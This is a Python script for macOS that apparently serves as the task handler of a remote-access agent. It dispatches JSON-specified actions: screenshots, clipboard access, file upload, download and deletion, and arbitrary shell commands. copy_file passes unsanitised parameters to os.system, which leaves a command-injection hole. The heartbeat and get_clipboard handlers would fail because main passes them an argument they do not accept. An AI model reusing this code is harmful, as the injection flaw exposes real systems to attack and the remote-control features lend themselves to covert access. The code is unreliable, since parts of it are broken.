
import os
import json
import subprocess
import argparse

def format_message_response(is_success, message):
    return {"success": is_success, "message": message}

def take_screen_shot(params):
    subprocess.run(["screencapture", "screenshot.png"])
    with open("screenshot.png", "rb") as f:
        image = f.read()
    return format_message_response(True, image.decode("latin-1"))

def heartbeat():
    return True

def upload_file(params):
    file_data = params.get("file_data")
    destination_path = params.get("destination_path")
    if not file_data or not destination_path:
        return format_message_response(False, "Invalid parameters")
    with open(destination_path, "wb") as f:
        f.write(file_data.encode("latin-1"))
    return format_message_response(True, f"File uploaded to {destination_path}")

def download_file(params):
    file_name = params.get("file_path")
    if not file_name or not os.path.exists(file_name):
        return format_message_response(False, "File not found")
    with open(file_name, "rb") as f:
        file_data = f.read()
    return format_message_response(True, file_data.decode("latin-1"))

def set_clipboard(params):
    text = params.get("text")
    if not text:
        return format_message_response(False, "Invalid parameters")
    process = subprocess.Popen("pbcopy", env={"LANG": "en_US.UTF-8"}, stdin=subprocess.PIPE)
    process.communicate(text.encode("utf-8"))
    return format_message_response(True, "Clipboard set")

def get_clipboard():
    process = subprocess.Popen("pbpaste", stdout=subprocess.PIPE)
    output, _ = process.communicate()
    return format_message_response(True, output.decode("utf-8"))

def list_directory(params):
    directory = params.get("directory")
    if not directory or not os.path.exists(directory):
        return format_message_response(False, "Invalid directory")
    files = os.listdir(directory)
    return format_message_response(True, files)

def rm_file(params):
    file = params.get("file")
    if not file or not os.path.exists(file):
        return format_message_response(False, "Invalid file")
    os.remove(file)
    return format_message_response(True, "File removed")

def copy_file(params):
    source = params.get("source")
    destination = params.get("destination")
    if not source or not destination or not os.path.exists(source):
        return format_message_response(False, "Invalid source or destination")
    os.system(f"cp {source} {destination}")
    return format_message_response(True, "File copied")

def run_command(params):
    command = params.get("command")
    if not command:
        return format_message_response(False, "Invalid command")
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, error = process.communicate()
    return format_message_response(True, output.decode("utf-8") + error.decode("utf-8"))

ACTIONS = {
    "take_screen_shot": {
        "function": take_screen_shot,
        "params": []
    },
    "upload_file": {
        "function": upload_file,
        "params": ["file_data", "destination_path"]
    },
    "download_file": {
        "function": download_file,
        "params": ["file_path"]
    },
    "heartbeat": {
        "function": heartbeat,
        "params": []
    },
    "set_clipboard": {
        "function": set_clipboard,
        "params": ["text"]
    },
    "get_clipboard": {
        "function": get_clipboard,
        "params": []
    },
    "list_directory": {
        "function": list_directory,
        "params": ["directory"]
    },
    "rm_file": {
        "function": rm_file,
        "params": ["file"]
    },
    "copy_file": {
        "function": copy_file,
        "params": ["source", "destination"]
    },
    "run_command": {
        "function": run_command,
        "params": ["command"]
    }
}

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--message", help="The action and params in JSON format")
    args = parser.parse_args()
    if not args.message:
        print("No message provided")
        return
    message = json.loads(args.message)
    action = message.get("action")
    params = message.get("params", {})
    if action in ACTIONS:
        action_info = ACTIONS[action]
        function = action_info["function"]
        params = {k: params.get(k) for k in action_info["params"]}
        result = function(params)
    else:
        result = format_message_response(False, "Invalid action")
    print(json.dumps(result))

if __name__ == "__main__":
    main()
